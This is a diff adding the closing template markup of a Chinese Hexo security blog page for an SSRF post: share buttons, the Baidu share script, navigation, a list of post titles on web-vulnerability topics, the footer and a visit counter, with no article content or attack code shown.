+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"SSRF漏洞　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/07/25/内网渗透之windows基础/" title="上一篇: Windows基础">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/04/04/SSRF漏洞/" title="下一篇: SSRF漏洞">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">SSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">文件包含漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2020 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
